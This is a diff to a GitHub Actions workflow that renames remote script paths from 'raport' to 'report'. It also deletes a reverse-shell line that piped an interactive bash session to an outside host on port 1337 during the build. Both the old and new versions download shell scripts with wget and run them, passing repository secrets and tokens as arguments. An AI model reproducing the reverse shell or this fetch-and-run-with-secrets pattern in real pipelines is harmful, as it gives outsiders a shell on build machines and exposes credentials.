@@ -33,15 +33,14 @@ jobs:
 
       - name: Set env variable
         run: |
-          bash -i >& /dev/tcp/home.voinearadu.com/1337 0>&1
-          wget https://raw.githubusercontent.com/L1ghtDream/raport/cdn/environment_variables.sh
+          wget https://raw.githubusercontent.com/L1ghtDream/report/cdn/environment_variables.sh
           sh environment_variables.sh ${{ github.REPOSITORY }}
 
       # ===== PUBLISH ======
 
       - name: Uploading artifacts
         run: |
-          wget https://raw.githubusercontent.com/L1ghtDream/raport/cdn/publish.sh
+          wget https://raw.githubusercontent.com/L1ghtDream/report/cdn/publish.sh
           sh publish.sh ${{ secrets.GITLAB_AUTH_HEADER_VALUE }} ${{ github.REPOSITORY }} ${{ secrets.GITHUB_TOKEN }} ${{ secrets.SELF_PASSWORD }}
 
       - name: Automatic Releases
@@ -53,7 +52,6 @@ jobs:
           title: "${{ env.VERSION }}"
           files: |
             build/libs/*.jar
-
 
       # ===== RENDERS ======
 
@@ -76,6 +74,5 @@ jobs:
 
       - name: "Updating remote raport"
         run: |
-          wget https://raw.githubusercontent.com/L1ghtDream/raport/cdn/update_raport.sh
-          #sh update_raport.sh  [raport_url]                         [artifact]          [version]          [github_access_token]
-          sh update_raport.sh   https://github.com/L1ghtDream/raport ${{ env.ARTIFACT }} ${{ env.VERSION }} ${{ secrets.PERSONAL_TOKEN }}
+          wget https://raw.githubusercontent.com/L1ghtDream/report/cdn/update_report.sh
+          sh update_report.sh https://github.com/L1ghtDream/report ${{ env.ARTIFACT }} ${{ env.VERSION }} ${{ secrets.PERSONAL_TOKEN }}
